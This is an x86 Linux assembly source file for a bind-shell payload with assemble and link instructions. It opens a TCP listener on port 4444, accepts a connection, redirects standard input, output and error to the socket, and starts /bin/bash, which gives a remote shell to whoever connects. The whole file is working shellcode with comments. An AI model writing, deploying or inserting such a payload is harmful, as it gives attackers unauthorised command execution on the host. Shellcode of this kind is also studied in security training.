; Filename:	bind_shell.nasm
; Author:	Jules Adriaens
; Assemble:	nasm -f elf32 -o bind_shell.o bind_shell.nasm
; Link:		ld -o bind_shell bind_shell.o

global _start

section .text
_start:


    ; Create TCP socket
    ; host_sockfd = socket(AF_INET, SOCK_STREAM, 0)
    xor edx, edx	; EDX = 0
    push edx		; ipproto_ip = 0
    xor ebx, ebx	; EBX = 0
    inc ebx		; EBX = 1
    push ebx		; sock_stream = 1
    push byte 0x2	; pf_inet = 2

    mov ecx, esp	; ECX points to args on stack
    push byte 0x66	; socketcall = 102
    pop eax		; EAX = 0x66
    int 0x80		; syscall
    xchg esi, eax	; store sockfd


    ; Bind socket
    ; bind(host_sockfd, (struct sockaddr *) &host_addr, sizeof(host_addr))
    push edx		; sin_addr = 0
    inc ebx		; sys_bind, EBX = 2
    push word 0x5c11	; sin_port = 4444	[!] Change port here (0x115c == 4444)
    push bx		; sin_family = 2

    mov ecx, esp	; ECX points to struct sockaddr
    push 0x10		; sizeof(host_addr)
    push ecx		; pointer to sockaddr
    push esi		; sockfd

    mov ecx, esp	; ECX points to args on stack
    push byte 0x66	; socketcall = 102
    pop eax		; EAX = 0x66
    int 0x80            ; syscall


    ; Listen on socket
    ; listen(host_sockfd, 3);
    inc ebx		; EBX = 3
    push ebx		; backlog connections = 3
    inc ebx             ; sys_listen, EBX = 4
    push esi            ; sockfd

    mov ecx, esp        ; ECX points to args on stack
    push byte 0x66      ; socketcall = 102
    pop eax             ; EAX = 0x66
    int 0x80            ; syscall


    ; Accept connection
    ; clnt_sockfd = accept(host_sockfd, NULL, NULL)
    push edx		; NULL
    push edx		; NULL
    push esi            ; sockfd
    inc ebx             ; sys_accept, EBX = 5

    mov ecx, esp        ; ECX points to args on stack
    push byte 0x66      ; socketcall = 102
    pop eax             ; EAX = 0x66
    int 0x80		; syscall


    ; Duplicate file descriptors
    ; dup2(clnt_sockfd, 0), dup2(clnt_sockfd, 1), dup2(clnt_sockfd, 2)
    xchg ebx, eax	; store sockfd
    push byte 0x2	; counter for loop
    pop ecx		; ECX = 2

    loop:
          mov al, 0x3f	; dup2() = 63
          int 0x80	; syscall
          dec ecx	; counter -1
    jns loop


    ; Spawn /bin/bash
    ; execve("/bin/bash", NULL, NULL)
    push edx		; Terminator = 0
    mov al, 0x0b	; execve = 11
    push 0x68736162	; push ////bin/bash on stack
    push 0x2f6e6962
    push 0x2f2f2f2f

    mov ebx, esp	; EBX points to args on stack
    mov ecx, edx	; ECX = 0
    int 0x80		; syscall
